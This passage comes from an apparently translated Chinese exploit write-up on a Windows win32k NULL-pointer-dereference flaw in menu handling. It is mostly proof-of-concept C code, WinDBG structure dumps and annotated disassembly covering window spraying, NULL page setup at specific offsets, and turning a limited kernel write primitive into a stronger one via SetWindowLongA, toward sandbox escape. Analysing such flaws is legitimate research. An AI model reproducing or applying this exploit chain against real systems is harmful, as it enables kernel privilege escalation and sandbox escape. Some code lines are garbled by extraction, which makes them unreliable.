    for (int y = 0; y pSelf;
    // If the kernel address of the hWND object leaked earlier in the code is greater than
    // the kernel address of the hWND object leaked above, execute the following code.
    if (firstEntryAddress > secondEntryAddress) {
    // Check if the difference between the two addresses is less than 0x3fd00.
    if ((firstEntryAddress - secondEntryAddress)  0x100; p++) {
    HWND temp = hwndSprayHandleTable[p];
    if ((temp != hPrimaryWindow) && (temp != hSecondaryWindow)) {
    DestroyWindow(temp);
    }
    }
    addressToWrite = (UINT)primaryWindowAddress + 0x90; // Set addressToWrite to
    // primaryWindow’s cbwndExtra field.
    printf(“[] Destroyed spare windows!rn”);
    // Check if its possible to set the window text in hSecondaryWindow.
    // If this isn’t possible, there is a serious error, and the program should exit.
    // Otherwise return TRUE as everything has been set up correctly.
    if (SetWindowTextW(hSecondaryWindow, L”test String”) == 0) {
    printf(“[!] Something is wrong, couldn’t initialize the text buffer in the secondary window….rn”);
    return FALSE;
    }
    else {
    return TRUE;
    }
最后，为了让PoC代码知道限制写入原语的位置，sprayWindows()还会设置addressToWrite并将地址写入至primaryWindowAddress的cbwndExtra域中。下图显示的是hPrimaryWindow中cbwndExtra域的修改情况：
通过执行功能更强的写入原语，攻击者将能够控制内核地址的值，这是实现沙盒逃逸的关键。下面给出的是WinDBG中查看到的tagWND对象，这也是非常关键的：
    1: kd> dt -r1 win32k!tagWND
    +0x000 head : _THRDESKHEAD
    +0x000 h : Ptr32 Void
    +0x004 cLockObj : Uint4B
    +0x008 pti : Ptr32 tagTHREADINFO
    +0x00c rpdesk : Ptr32 tagDESKTOP
    +0x010 pSelf : Ptr32 UChar
    …
    +0x084 strName : _LARGE_UNICODE_STRING
    +0x000 Length : Uint4B
    +0x004 MaximumLength : Pos 0, 31 Bits
    +0x004 bAnsi : Pos 31, 1 Bit
    +0x008 Buffer : Ptr32 Uint2B
    +0x090 cbwndExtra : Int4B
    … 
###  在内存中设置NULL页面
为了正确设置NULL页面，必须填充下列偏移量：
`0x20  
0x34  
0x4C  
0x50 to 0x1050`
具体内容如下图所示：
漏洞利用代码会将NULL页面中偏移量0x20填充0xFFFFFFFF，此时的spMenu会被设置为NULL，所以spMenu->cItems将包含NULL页面偏移量0x20的值。相关代码如下:
`tagITEM *__stdcall MNGetpItemFromIndex(tagMENU *spMenu, UINT pPopupMenu)  
{  
tagITEM *result; // eax  
if ( pPopupMenu == -1 || pPopupMenu >= spMenu->cItems ) // NULL pointer
dereference will occur  
// here if spMenu is NULL.  
result = 0;  
else  
result = (tagITEM *)spMenu->rgItems + 0x6C * pPopupMenu;  
return result;  
}`
NULL页面偏移量0x34所包含的DWORD值为spMenu->rgItemsd的值，而xxxMNUpdateDraggingInfo()将会利用这些偏移量来进行进一步操作：
`.text:BF975EA3 mov eax, [ebx+14h] ; EAX = ppopupmenu->spmenu  
.text:BF975EA3 ;  
.text:BF975EA3 ; Should set EAX to 0 or NULL.  
.text:BF975EA6 push dword ptr [eax+4Ch] ; uIndex aka pPopupMenu. This will be
the  
.text:BF975EA6 ; value at address 0x4C given that  
.text:BF975EA6 ; ppopupmenu->spmenu is NULL.  
.text:BF975EA9 push eax ; spMenu. Will be NULL or 0.  
.text:BF975EAA call MNGetpItemFromIndex  
..............  
.text:BF975EBA add ecx, [eax+28h] ; ECX += pItemFromIndex->yItem  
.text:BF975EBA ;  
.text:BF975EBA ; pItemFromIndex->yItem will be the value  
.text:BF975EBA ; at offset 0x28 of whatever value  
.text:BF975EBA ; MNGetpItemFromIndex returns.  
...............  
.text:BF975ECE cmp ecx, ebx  
.text:BF975ED0 jg short loc_BF975EDB ; Jump to loc_BF975EDB if the following  
.text:BF975ED0 ; condition is true:  
.text:BF975ED0 ;  
.text:BF975ED0 ; ((pMenuState->ptMouseLast.y -pMenuState->uDraggingHitArea->rcClient.top) + pItemFromIndex->yItem) >
(pItem->yItem + SYSMET(CYDRAG))`
###  利用限制写入原语创建更加强大的写入原语
NULL页面设置完成之后，SubMenuProc()将会把hWndFakeMenu返回给xxxMNFindWindowFromPoint()中的xxxSendMessage()，并继续执行：
`memset((void *)0x50, 0xF0, 0x1000);  
return (ULONG)hWndFakeMenu;`
在调用xxxSendMessage()之后，xxxMNFindWindowFromPoint()将会调用HMValidateHandleNoSecure()来确保hWndFakeMenu成为了窗口对象的处理器。相关代码如下所示：
`v6 = xxxSendMessage(  
var_pPopupMenu->spwndNextPopup,  
MN_FINDMENUWINDOWFROMPOINT,  
(WPARAM)&pPopupMenu,  
(unsigned __int16)screenPt.x | (*(unsigned int *)&screenPt >> 16 message == 0x1E5)) {  
UINT offset = 0; // Create the offset variable which will hold the offset from
the  
// start of hPrimaryWindow's cbwnd data field to write to.  
UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + 0xB0); //
Set  
// addressOfStartofPrimaryWndCbWndData to the address of  
// the start of hPrimaryWindow's cbwnd data field.  
// Set offset to the difference between hSecondaryWindow's  
// strName.Buffer's memory address and the address of  
// hPrimaryWindow's cbwnd data field.  
offset = ((secondaryWindowAddress + 0x8C) -addressOfStartofPrimaryWndCbWndData);  
printf("[*] Offset: 0x%08Xrn", offset);  
// Set the strName.Buffer address in hSecondaryWindow to
(secondaryWindowAddress + 0x16),  
// or the address of the bServerSideWindowProc bit.  
if (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + 0x16)) ==
0) {  